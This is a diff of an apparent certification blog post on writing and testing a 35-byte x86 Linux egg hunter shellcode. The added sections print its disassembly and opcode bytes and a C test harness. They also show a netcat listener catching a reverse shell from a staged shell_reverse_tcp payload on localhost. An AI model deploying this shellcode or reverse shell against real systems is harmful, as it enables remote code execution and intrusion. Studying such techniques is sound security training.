@@ -1,7 +1,7 @@
 ## Assignment 0x03: Create An Egg Hunter Shellcode
 ---
 ## Objectives
-Create a Shell_Reverse_TCP shellcode that;
+Create a egghunter shellcode that;
 1. Create a working demo of the Egg Hunter
 2. Egg Hunter should be configurable for different payloads
 
@@ -20,7 +20,8 @@ There is a wealth of information available on the subject, and as such, the demo
 
 The rest of this post will aim to explain, analyze, and demonstrate an egg hunter shellcode inspired by the work of Matt Miller.
 
-## Egg Hunter Shellcode: Explanation
+## Egg Hunter Shellcode
+#### Explanation
 The egg hunter shellcode that will be explained in this section utilizes the `access` system call to search virtual address space for the egg value. The system call number for `access` is decimal `33` which can be determined from the `unistd_32.h` file explained in previous posts. 
 
 ```
@@ -47,7 +48,7 @@ The comparision functionality of the egg hunter shellcode is provided by the str
 
 Through the general processes explained above, the egg will eventually be found in memory and the shellcode immediately following the egg will be executed.
 
-## Egg Hunter Shellcode: Analysis
+#### Analysis
 The egg hunter shellcode will be explained below. The assembly code will come first, followed by an explanation of the instructions.
 
 ```nasm
@@ -164,7 +165,64 @@ inc_address:
     jmp edi
 ```
 
-## Egg Hunter Shellcode: Demonstration
+## Compile & Test
+#### Compiling & Examining the Assembly
+The egghunter shellcode `egghunter.nasm` is compiled as explained in previous posts. The commands used were run on 64-bit Kali Linux. To start, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.
+
+```shell
+root@kali:~/workspace/SLAE/# nasm -f elf32 egghunter.nasm -o egghunter.o
+```
+
+With the code assembled, the next step is to link the `egghunter.o` file with `/usr/bin/ld`. The `-m` flag specifies that the `elf_i386` emulation linker should be used.
+
+```shell
+root@kali:~/workspace/SLAE/# ld -m elf_i386 egghunter.o -o egghunter
+```
+
+As `egghunter` has been compiled and linked, it should now be disassembled into opcodes using `/usr/bin/objdump` for further examination. Using the command shown below, the operation codes can be examined for any `NULL` characters. The output has been truncated to conserve space.
+
+```shell
+root@kali:~/workspace/SLAE/assignments/0x03# objdump -d ./egghunter -M intel
+
+./egghunter:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       31 d2                   xor    edx,edx
+
+08049002 <align_page>:
+ 8049002:       66 81 ca ff 0f          or     dx,0xfff
+
+08049007 <inc_address>:
+ 8049007:       42                      inc    edx
+ 8049008:       8d 5a 04                lea    ebx,[edx+0x4]
+ 804900b:       6a 21                   push   0x21
+ 804900d:       58                      pop    eax
+ 804900e:       cd 80                   int    0x80
+ 8049010:       3c f2                   cmp    al,0xf2
+ 8049012:       74 ee                   je     8049002 <align_page>
+ 8049014:       b8 90 50 90 50          mov    eax,0x50905090
+ 8049019:       89 d7                   mov    edi,edx
+ 804901b:       af                      scas   eax,DWORD PTR es:[edi]
+ 804901c:       75 e9                   jne    8049007 <inc_address>
+ 804901e:       af                      scas   eax,DWORD PTR es:[edi]
+ 804901f:       75 e6                   jne    8049007 <inc_address>
+ 8049021:       ff e7                   jmp    edi
+```
+
+Upon confirmation, the shellcode can be extracted using the bash one-line command outlined in previous posts. The resulting `egghunter` shellcode is shown below.
+
+```shell
+\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7
+```
+
+#### Demonstrating the Egg Hunter
+As demonstrated in previous posts, the `sc_test.c` program can be used to test the `egghunter` shellcode. As the Egg Hunter technique is a type of staged payload, the `egghunter` portion cannot be tested without a complementary shellcode that is prepended by the 8-byte egg as explained earlier in this post. With that being said, the `shell_reverse_tcp` reverse shell shellcode from the "Create A Shell_Reverse_TCP Shellcode" paper will be used for this purpose. Additionally, `sc_test.c` has been modified to print the length of the `egghunter` shellcode as well as the length of `shell_reverse_tcp` shellcode prepended with the 8-byte egg.
+
+To test the `egghunter` shellcode with a different payload, simply replace the payload contents below the `/* Current payload: */` comment with the desired shellcode payload.
+
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -174,14 +232,14 @@ To compile:
 gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
 */
 
-unsigned char egghunter[] = \ 
+unsigned char egghunter[] = \
     "\x31\xd2\x66\x81\xca\xff\x0f\x42"
     "\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
     "\x3c\xf2\x74\xee\xb8\x90\x50\x90"
     "\x50\x89\xd7\xaf\x75\xe9\xaf\x75"
     "\xe6\xff\xe7";
 
-unsigned char shellcode[] = \ 
+unsigned char shellcode[] = \
     /* Egg */
     "\x90\x50\x90\x50\x90\x50\x90\x50"
     /* Insert any other payload below */
@@ -205,6 +263,48 @@ int main(void)
     int (*ret)() = (int(*)())egghunter;
     ret();
 }
+```
+
+As explained in the testing of `shell_reverse_tcp`, the same general steps should be taken here to test the `egghunter` shellcode. If the `egghunter` shellcode successfully locates the egg that prepends `shell_reverse_tcp`, a reverse shell will be returned to the listening system on a specified IP address and port. The entire process is outlined again below.
+
+The above program is compiled using the command shown below, as suggested in the commented program code.
+
+```shell
+root@kali:~/workspace/SLAE# gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
+```
+
+Before `sc_test` is executed, a `nc` or `ncat` listener should be set up in a seperate terminal window to act as the remote system to which the reverse shell should connect to. 
+
+```shell
+root@kali:~/workspace/SLAE# nc -lvp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+```
+
+The default IP address used in the `shell_reverse_tcp` shellcode is `127.0.0.1` and the default listening port is `4444`. Once the listener is configured, running `sc_test` results in a shell on the system, which confirms that the `egghunter` shellcode succesfully located the `shell_reverse_tcp` shellcode prepended by the `\x90\x50\x90\x50\x90\x50\x90\x50` egg.
+
+In the terminal window that runs `sc_test`:
+
+```shell
+root@kali:~/workspace/SLAE# ./sc_test
+Egghunter Length: 35
+Shellcode Length: 96
+```
+
+And in the terminal window that runs `nc`:
+
+```shell
+root@kali:~/workspace/SLAE# nc -lvp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:41410.
+ls -lah | grep egghunter
+-rwxr-xr-x  1 root root 4.5K Oct 13 22:17 egghunter
+-rw-r--r--  1 root root  489 Oct 13 22:17 egghunter.nasm
+-rw-r--r--  1 root root  512 Oct 13 22:17 egghunter.o
 ```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
